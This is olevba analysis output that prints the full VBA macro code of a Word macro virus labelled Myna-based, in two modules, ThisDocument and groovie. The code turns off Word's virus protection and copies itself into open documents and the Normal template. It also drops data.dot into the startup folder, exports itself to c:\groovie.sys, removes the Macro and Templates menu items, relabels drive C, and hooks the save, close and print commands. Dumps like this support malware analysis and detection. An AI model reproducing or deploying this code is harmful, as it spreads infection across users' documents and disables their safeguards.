olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myna-based-b708afa9ff7ce44a388f6ff459ce9a7b29e5d148
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myna-based-b708afa9ff7ce44a388f6ff459ce9a7b29e5d148 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'bangongshi99-11-22 8:49:45HP LaserJet 2100 Series PCL 6 on \\FLS1502\HP 2100FLS¹ØÓÚÐ­µ÷ÄãÁ½µ¥Î»¾­¼ÃÒµÎñ¾À·×µÄÍ¨Öª.doc
On Error GoTo out
'bangongshi99-11-22 8:49:45HP LaserJet 2100 Series PCL 6 on \\FLS1502\HP 2100FLS¹ØÓÚÐ­µ÷ÄãÁ½µ¥Î»¾­¼ÃÒµÎñ¾À·×µÄÍ¨Öª.doc
Options.VirusProtection = False
'bangongshi99-11-22 8:49:45HP LaserJet 2100 Series PCL 6 on \\FLS1502\HP 2100FLS¹ØÓÚÐ­µ÷ÄãÁ½µ¥Î»¾­¼ÃÒµÎñ¾À·×µÄÍ¨Öª.doc
Options.SaveNormalPrompt = False
'bangongshi99-11-22 8:49:45HP LaserJet 2100 Series PCL 6 on \\FLS1502\HP 2100FLS¹ØÓÚÐ­µ÷ÄãÁ½µ¥Î»¾­¼ÃÒµÎñ¾À·×µÄÍ¨Öª.doc
Options.ConfirmConversions = False
'bangongshi99-11-22 8:49:45HP LaserJet 2100 Series PCL 6 on \\FLS1502\HP 2100FLS¹ØÓÚÐ­µ÷ÄãÁ½µ¥Î»¾­¼ÃÒµÎñ¾À·×µÄÍ¨Öª.doc
Private Sub Document_Close()

'

Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xItem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xItem In NormalTemplate.VBProject.VBComponents
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_New()
'
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xItem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xItem In NormalTemplate.VBProject.VBComponents
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_Open()
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 answer = "MYNAMEISVIRUS"
  Options.VirusProtection = False
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xItem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xItem In NormalTemplate.VBProject.VBComponents
    If xItem.Name = "ThisDocument" Then
    send = xItem.CodeModule.countoflines
    aready = xItem.CodeModule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xItem.CodeModule
             .InsertLines star, MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub






-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Myna-based-b708afa9ff7ce44a388f6ff459ce9a7b29e5d148 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I02 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I03 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I04 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I05 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I06 As String
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I07 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I08 As Boolean
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I09()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = NormalTemplate Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I01 = "normal"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        GoTo checkout
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
checkout:
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I10()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I11()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I09
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I10
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "document" Then Call I12
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "normal" Then Call I13
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "orbit" Then Call I14
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I12()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I03 = False And I05 = False Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With NormalTemplate.VBProject
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Shell ("label c: groovie"), 0
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I13()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I17
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I04 = False And I07 = True Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With ActiveDocument.VBProject
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Execute
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = True Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = False Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Documents.Add Template:="", NewTemplate:=False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I14()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I03 = False And I05 = False Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With NormalTemplate.VBProject
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            NormalTemplate.Save
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I04 = False Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With ActiveDocument.VBProject
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Execute
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I15()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.VirusProtection = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.SaveNormalPrompt = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.ConfirmConversions = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I06 = ActiveDocument.FullName
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I11
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoOpen()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoClose()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoExit()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileSaveAs()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFileSaveAs).Show
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub filesave()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileclose()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.Close
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileprint()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFilePrint).Show
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ViewVBCode()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileTemplates()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I17()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error GoTo docek
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If ActiveDocument.Name <> "" Then
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I07 = True
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    GoTo over
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
docek:
